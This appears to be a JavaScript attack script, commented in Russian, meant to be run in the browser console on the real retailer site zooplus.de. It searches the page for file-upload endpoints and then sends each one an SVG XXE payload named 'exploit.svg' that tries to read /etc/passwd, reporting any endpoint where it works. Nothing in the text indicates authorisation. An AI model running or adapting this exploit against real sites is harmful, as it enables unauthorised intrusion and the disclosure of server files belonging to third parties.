// JavaScript для выполнения в браузере - поиск upload endpoints
// Выполнить в консоли браузера на странице zooplus.de

console.log("[*] Searching for upload endpoints in JavaScript...");

// 1. Поиск в window объекте
let uploadEndpoints = [];

// Поиск в fetch/axios вызовах
const scripts = document.getElementsByTagName('script');
for (let script of scripts) {
    if (script.src) {
        try {
            const response = await fetch(script.src);
            const text = await response.text();
            const matches = text.match(/["'](\/[^"']*upload[^"']*)["']/gi);
            if (matches) {
                matches.forEach(m => {
                    const ep = m.replace(/["']/g, '');
                    if (!uploadEndpoints.includes(ep)) {
                        uploadEndpoints.push(ep);
                        console.log(`  Found: ${ep}`);
                    }
                });
            }
        } catch(e) {}
    }
}

// 2. Поиск в data атрибутах
document.querySelectorAll('[data-upload], [data-url], [data-endpoint]').forEach(el => {
    const url = el.getAttribute('data-upload') || el.getAttribute('data-url') || el.getAttribute('data-endpoint');
    if (url && url.includes('upload')) {
        console.log(`  Found in data attribute: ${url}`);
        uploadEndpoints.push(url);
    }
});

// 3. Поиск форм с enctype="multipart/form-data"
document.querySelectorAll('form[enctype*="multipart"]').forEach(form => {
    const action = form.action;
    if (action && action.includes('upload')) {
        console.log(`  Found form action: ${action}`);
        uploadEndpoints.push(action);
    }
});

// 4. Поиск input[type="file"]
document.querySelectorAll('input[type="file"]').forEach(input => {
    const form = input.closest('form');
    if (form && form.action) {
        console.log(`  Found file input in form: ${form.action}`);
        uploadEndpoints.push(form.action);
    }
});

console.log(`\n[+] Total upload endpoints found: ${uploadEndpoints.length}`);
console.log(uploadEndpoints);

// 5. Тест SVG XXE
const svgXXE = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>';
const blob = new Blob([svgXXE], {type: 'image/svg+xml'});
const file = new File([blob], 'exploit.svg', {type: 'image/svg+xml'});

for (let endpoint of uploadEndpoints) {
    const formData = new FormData();
    formData.append('file', file);
    
    fetch(endpoint, {
        method: 'POST',
        body: formData,
        credentials: 'include'
    })
    .then(r => r.text())
    .then(text => {
        if (text.includes('root:') || text.includes('root:x:0:0')) {
            console.log(`[CRITICAL] SVG XXE works on: ${endpoint}`);
            console.log(`Response: ${text.substring(0, 500)}`);
        }
    })
    .catch(e => {});
}

